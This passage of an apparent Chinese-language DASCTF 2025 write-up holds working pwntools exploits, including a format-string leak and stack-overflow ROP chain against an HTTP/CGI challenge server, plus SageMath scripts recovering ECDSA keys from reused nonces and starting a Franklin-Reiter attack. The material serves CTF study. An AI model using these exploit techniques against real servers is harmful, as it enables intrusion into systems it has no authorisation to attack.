</span></span><span class=line><span class=cl><span class=n>pause</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>pay</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;B&#39;</span> <span class=o>*</span><span class=mh>0x10</span>
</span></span><span class=line><span class=cl><span class=n>pay</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>bss</span><span class=o>+</span><span class=mh>0x18</span><span class=o>+</span><span class=n>oo</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>pay</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>ret1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=p>(</span><span class=n>pay</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>pause</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#gdb.attach(io,gdbscript=gdbscript)</span>
</span></span><span class=line><span class=cl><span class=n>pay</span>  <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>rbp</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x404d60</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>pay</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x040114E</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=p>(</span><span class=n>pay</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1>#pause()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>itr</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=nsusserver>NSUSServer</h2><p>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ³„éœ²åœ°å€ï¼Œ ç„¶å ç›´æ¥æ ˆæº¢å‡º</p><p>a.so å¯ä»¥ç›´æ¥è®¿é—®è¿œç¨‹ç¯å¢ƒä¸‹è½½</p><p><img src=/img/2025-DASCTF%E4%B8%8A%E5%8D%8A%E5%B9%B4/8312ebfa-6b66-4a8e-a565-57b42f3575ca.png alt=img></p><p>è®¿é—®ä¸€ä¸ªä¸å­˜åœ¨çš„æ–‡ä»¶æ—¶ï¼Œä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•° å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</p><p><img src=/img/2025-DASCTF%E4%B8%8A%E5%8D%8A%E5%B9%B4/90840edc-856b-4c9c-b041-35f1cc01a6c0.png alt=img></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span><span class=lnt>82
</span><span class=lnt>83
</span><span class=lnt>84
</span><span class=lnt>85
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=c1>#from ctypes import CDLL</span>
</span></span><span class=line><span class=cl><span class=c1>#cdl = CDLL(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)</span>
</span></span><span class=line><span class=cl><span class=n>s</span>    <span class=o>=</span> <span class=k>lambda</span>   <span class=n>x</span> <span class=p>:</span> <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>x</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sa</span>   <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span><span class=p>,</span><span class=n>y</span> <span class=p>:</span> <span class=n>io</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=n>x</span><span class=p>,</span><span class=n>y</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sl</span>   <span class=o>=</span> <span class=k>lambda</span>   <span class=n>x</span> <span class=p>:</span> <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>x</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sla</span>  <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span><span class=p>,</span><span class=n>y</span> <span class=p>:</span> <span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=n>x</span><span class=p>,</span><span class=n>y</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r</span>    <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span>   <span class=p>:</span> <span class=n>io</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=n>x</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ru</span>   <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span>   <span class=p>:</span> <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=n>x</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>rl</span>   <span class=o>=</span> <span class=k>lambda</span>     <span class=p>:</span> <span class=n>io</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>itr</span>  <span class=o>=</span> <span class=k>lambda</span>     <span class=p>:</span> <span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>uu32</span> <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span>   <span class=p>:</span> <span class=n>u32</span><span class=p>(</span><span class=n>x</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>4</span><span class=p>,</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>uu64</span> <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span>   <span class=p>:</span> <span class=n>u64</span><span class=p>(</span><span class=n>x</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>ls</span>   <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span>   <span class=p>:</span> <span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=n>x</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>lss</span>  <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span>   <span class=p>:</span> <span class=n>ls</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\033</span><span class=s1>[1;31;40m</span><span class=si>%s</span><span class=s1> -&gt; 0x</span><span class=si>%x</span><span class=s1> </span><span class=se>\033</span><span class=s1>[0m&#39;</span> <span class=o>%</span> <span class=p>(</span><span class=n>x</span><span class=p>,</span> <span class=nb>eval</span><span class=p>(</span><span class=n>x</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>attack</span> <span class=o>=</span> <span class=s1>&#39;127.0.0.1 9999&#39;</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s1>&#39; &#39;</span><span class=p>,</span><span class=s1>&#39;:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>attack</span> <span class=o>=</span> <span class=s1>&#39;node5.buuoj.cn:27338&#39;</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s1>&#39; &#39;</span><span class=p>,</span><span class=s1>&#39;:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>binary</span> <span class=o>=</span> <span class=s1>&#39;./attachment&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=p>(</span><span class=n>binary</span> <span class=o>=</span> <span class=n>binary</span><span class=p>,</span> <span class=n>log_level</span> <span class=o>=</span> <span class=s1>&#39;debug&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=n>terminal</span><span class=o>=</span><span class=s1>&#39;tmux splitw -h -l 170&#39;</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39; &#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=c1>#libc = context.binary.libc</span>
</span></span><span class=line><span class=cl><span class=c1>#elf  = ELF(binary)</span>
</span></span><span class=line><span class=cl><span class=c1>#print(context.binary.libs)</span>
</span></span><span class=line><span class=cl><span class=c1>#libc = ELF(&#39;./libc.so.6&#39;)</span>
</span></span><span class=line><span class=cl><span class=c1>#import socks</span>
</span></span><span class=line><span class=cl><span class=c1>#context.proxy = (socks.SOCKS5, &#39;192.168.31.251&#39;, 10808)</span>
</span></span><span class=line><span class=cl><span class=n>gdbscript</span> <span class=o>=</span> <span class=s1>&#39;&#39;&#39;
</span></span></span><span class=line><span class=cl><span class=s1>#continue
</span></span></span><span class=line><span class=cl><span class=s1>&#39;&#39;&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=o>**</span><span class=nb>locals</span><span class=p>())</span>
</span></span><span class=line><span class=cl><span class=c1>#import os</span>
</span></span><span class=line><span class=cl><span class=c1>#os.systimport os</span>
</span></span><span class=line><span class=cl><span class=n>io</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=o>*</span><span class=n>attack</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=c1>#io = start([])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>n</span> <span class=o>=</span> <span class=mi>4</span>
</span></span><span class=line><span class=cl><span class=n>path</span> <span class=o>=</span> <span class=sa>f</span><span class=s1>&#39;HACK%</span><span class=si>{</span><span class=n>n</span><span class=o>+</span><span class=mh>0xf1</span><span class=si>}</span><span class=s1>$p-%</span><span class=si>{</span><span class=n>n</span><span class=o>+</span><span class=mh>0xf3</span><span class=si>}</span><span class=s1>$p-%</span><span class=si>{</span><span class=n>n</span><span class=o>+</span><span class=mh>0xf5</span><span class=si>}</span><span class=s1>$p-HACK&#39;</span>
</span></span><span class=line><span class=cl><span class=n>headers</span> <span class=o>=</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>    <span class=sa>f</span><span class=s2>&#34;GET </span><span class=si>{</span><span class=n>path</span><span class=si>}</span><span class=s2> HTTP/1.1</span><span class=se>\r\n</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;</span><span class=se>\r\n</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=p>(</span><span class=n>headers</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;HACK&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>canary</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;-&#39;</span><span class=p>)[:</span><span class=o>-</span><span class=mi>1</span><span class=p>],</span><span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>libc_base</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;-&#39;</span><span class=p>)[:</span><span class=o>-</span><span class=mi>1</span><span class=p>],</span><span class=mi>16</span><span class=p>)</span> <span class=o>-</span> <span class=mh>0x29d90</span>
</span></span><span class=line><span class=cl><span class=n>elf_base</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;-&#39;</span><span class=p>)[:</span><span class=o>-</span><span class=mi>1</span><span class=p>],</span><span class=mi>16</span><span class=p>)</span> <span class=o>-</span> <span class=mh>0x0379E</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>lss</span><span class=p>(</span><span class=s1>&#39;canary&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>lss</span><span class=p>(</span><span class=s1>&#39;libc_base&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>lss</span><span class=p>(</span><span class=s1>&#39;elf_base&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>io</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=o>*</span><span class=n>attack</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>rdi</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=mh>0x000000000002a3e5</span> <span class=c1># pop rdi ; ret</span>
</span></span><span class=line><span class=cl><span class=n>rsi</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=mh>0x000000000002be51</span> <span class=c1># pop rsi ; ret</span>
</span></span><span class=line><span class=cl><span class=n>flag</span> <span class=o>=</span>  <span class=n>elf_base</span> <span class=o>+</span> <span class=mh>0x043AB</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>pay</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;A&#39;</span> <span class=o>*</span> <span class=mh>0x48</span>
</span></span><span class=line><span class=cl><span class=n>pay</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>canary</span><span class=p>)</span> <span class=o>*</span> <span class=mi>2</span>
</span></span><span class=line><span class=cl><span class=n>pay</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0xbeefbeef</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>pay</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0xbeef1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>pay</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>rdi</span><span class=o>+</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>pay</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>rsi</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>pay</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>flag</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>pay</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>rdi</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>pay</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>4</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>pay</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>elf_base</span> <span class=o>+</span> <span class=mh>0x2BA3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>headers</span> <span class=o>=</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>    <span class=sa>b</span><span class=s2>&#34;GET /a.cgi?input=&#34;</span> <span class=o>+</span> <span class=n>pay</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34; HTTP/1.1</span><span class=se>\r\n</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>    <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\r\n</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=p>(</span><span class=n>headers</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#pay = flat({</span>
</span></span><span class=line><span class=cl><span class=c1>#},filler=b&#39;\x00&#39;)</span>
</span></span><span class=line><span class=cl><span class=c1>#gdb.attach(io,gdbscript)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># libc.address = libc_base</span>
</span></span><span class=line><span class=cl><span class=c1># system = libc.sym[&#39;system&#39;]</span>
</span></span><span class=line><span class=cl><span class=c1># bin_sh = next(libc.search(b&#39;/bin/sh&#39;))</span>
</span></span><span class=line><span class=cl><span class=n>itr</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h1 id=crypto>Crypto</h1><h2 id=excessive-security>Excessive Security</h2><p>ecdsaå¤ç”¨äº†éšæœºæ•°k1ã€k2å’Œç§é’¥x1ã€x2ï¼Œå››ä¸ªå¼å­æ•´ç†ä¸€ä¸‹å°±æ˜¯ä¸¤å˜é‡x1ã€x2å’Œä¸¤ä¸ªæ–¹ç¨‹ï¼Œå¯ä»¥ç”¨çŸ©é˜µè§£ã€‚å‰©ä¸‹æ‰“Franklin-Reiteræ”»å‡»ï¼Œç³»æ•°å¤§äº†ç‚¹ç”¨HGCDå³å¯ã€‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=n>n</span> <span class=o>=</span> <span class=mi>115792089237316195423570985008687907852837564279074904382605163141518161494337</span>
</span></span><span class=line><span class=cl><span class=n>Zn</span> <span class=o>=</span> <span class=n>Zmod</span><span class=p>(</span><span class=n>n</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>s1</span> <span class=o>=</span> <span class=n>Zn</span><span class=p>(</span><span class=mi>70264613994433317101824708333691569351293428290775945022557096997867421112623</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>s2</span> <span class=o>=</span> <span class=n>Zn</span><span class=p>(</span><span class=mi>27386247988345867998752358066350183725137348277248603318763377237810993039608</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>h1</span> <span class=o>=</span> <span class=n>Zn</span><span class=p>(</span><span class=mi>68926494835039378729440404424793589316085902585443402029912033361291851069895</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>h2</span> <span class=o>=</span> <span class=n>Zn</span><span class=p>(</span><span class=mi>99816429822339421445908151468618514820067970997726274244928092260385418279182</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r1</span> <span class=o>=</span> <span class=n>Zn</span><span class=p>(</span><span class=mi>95467825458659408375936425122753380788640181504557006906236884175684680903422</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>s3</span> <span class=o>=</span> <span class=n>Zn</span><span class=p>(</span><span class=mi>108271537842404710192407976239166854351892165018292127464175836717873395489565</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>s4</span> <span class=o>=</span> <span class=n>Zn</span><span class=p>(</span><span class=mi>100312693542625967610858608130705401648902828203826044299984002070083890684220</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>h3</span> <span class=o>=</span> <span class=n>Zn</span><span class=p>(</span><span class=mi>100471089356874379799029324099340355602511511524623953182021635156113287196537</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>h4</span> <span class=o>=</span> <span class=n>Zn</span><span class=p>(</span><span class=mi>53552261622392134420510144174810499568173979993026285111445672642139328877380</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r2</span> <span class=o>=</span> <span class=n>Zn</span><span class=p>(</span><span class=mi>13940715298251935708383205669373172931583958487449924842542107474174521484127</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>A</span> <span class=o>=</span> <span class=n>Matrix</span><span class=p>(</span><span class=n>Zn</span><span class=p>,</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>    <span class=p>[</span><span class=n>s2</span> <span class=o>*</span> <span class=n>r1</span><span class=p>,</span> <span class=o>-</span><span class=n>s1</span> <span class=o>*</span> <span class=n>r1</span><span class=p>],</span>
</span></span><span class=line><span class=cl>    <span class=p>[</span><span class=n>s4</span> <span class=o>*</span> <span class=n>r2</span><span class=p>,</span> <span class=o>-</span><span class=n>s3</span> <span class=o>*</span> <span class=n>r2</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>b</span> <span class=o>=</span> <span class=n>vector</span><span class=p>(</span><span class=n>Zn</span><span class=p>,</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>    <span class=n>s1</span> <span class=o>*</span> <span class=n>h2</span> <span class=o>-</span> <span class=n>s2</span> <span class=o>*</span> <span class=n>h1</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>s3</span> <span class=o>*</span> <span class=n>h4</span> <span class=o>-</span> <span class=n>s4</span> <span class=o>*</span> <span class=n>h3</span>
</span></span><span class=line><span class=cl><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>A</span><span class=o>.</span><span class=n>is_singular</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[-] no&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>sol</span> <span class=o>=</span> <span class=n>A</span><span class=o>.</span><span class=n>solve_right</span><span class=p>(</span><span class=n>b</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[+] findï¼š&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;x1 = </span><span class=si>{</span><span class=n>sol</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;x2 = </span><span class=si>{</span><span class=n>sol</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>N</span> <span class=o>=</span> <span class=mi>98472559301398326519521704898800552100670435952553618641467704945731627783624140484670366845550939866842528582954361836035593755351584272693016822204234859506655433796327589389300744153263194916217158205372375670404000164793308078231134726345672236542974067442646354084915978240909130405000905936105602786257</span>
</span></span><span class=line><span class=cl><span class=n>c1</span> <span class=o>=</span> <span class=mi>40127670364311180283394426274113033719543797673129006844648567069726278369353910517424074073714346881895826377902772771837790964432434997986229629267700081564740160692151350365553131535789070670584548053624970689607275665921674708650254889369926426966093575171344082441699295255661725211366819524902641461331</span>
</span></span><span class=line><span class=cl><span class=n>c2</span> <span class=o>=</span> <span class=mi>4958767685161688254408001463637498631434015989118088175006720150146904021732816429444998309662995333252926794359370922113211567042198257249974382506057347524044728912256607992806670035884054654064021329936092742390064660715742236775795950389452053770118911570676738879382827738088237377423216124023239179385</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>x1</span><span class=o>=</span><span class=mi>17754677231116188359396131937000664637388235962309739341039576063530375612219</span>
</span></span><span class=line><span class=cl><span class=n>x2</span><span class=o>=</span><span class=mi>79541650983569507936838949546074094434344869740141472134648391439474061318003</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Util.number</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>HGCD</span><span class=p>(</span><span class=n>a</span><span class=p>,</span> <span class=n>b</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=mi>2</span> <span class=o>*</span> <span class=n>b</span><span class=o>.</span><span class=n>degree</span><span class=p>()</span> <span class=o>&lt;=</span> <span class=n>a</span><span class=o>.</span><span class=n>degree</span><span class=p>()</span> <span class=ow>or</span> <span class=n>a</span><span class=o>.</span><span class=n>degree</span><span class=p>()</span> <span class=o>==</span> <span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>1</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>    <span class=n>m</span> <span class=o>=</span> <span class=n>a</span><span class=o>.</span><span class=n>degree</span><span class=p>()</span> <span class=o>//</span> <span class=mi>2</span>
</span></span><span class=line><span class=cl>    <span class=n>a_top</span><span class=p>,</span> <span class=n>a_bot</span> <span class=o>=</span> <span class=n>a</span><span class=o>.</span><span class=n>quo_rem</span><span class=p>(</span><span class=n>x</span> <span class=o>^</span> <span class=n>m</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>b_top</span><span class=p>,</span> <span class=n>b_bot</span> <span class=o>=</span> <span class=n>b</span><span class=o>.</span><span class=n>quo_rem</span><span class=p>(</span><span class=n>x</span> <span class=o>^</span> <span class=n>m</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>R00</span><span class=p>,</span> <span class=n>R01</span><span class=p>,</span> <span class=n>R10</span><span class=p>,</span> <span class=n>R11</span> <span class=o>=</span> <span class=n>HGCD</span><span class=p>(</span><span class=n>a_top</span><span class=p>,</span> <span class=n>b_top</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>c</span> <span class=o>=</span> <span class=n>R00</span> <span class=o>*</span> <span class=n>a</span> <span class=o>+</span> <span class=n>R01</span> <span class=o>*</span> <span class=n>b</span>
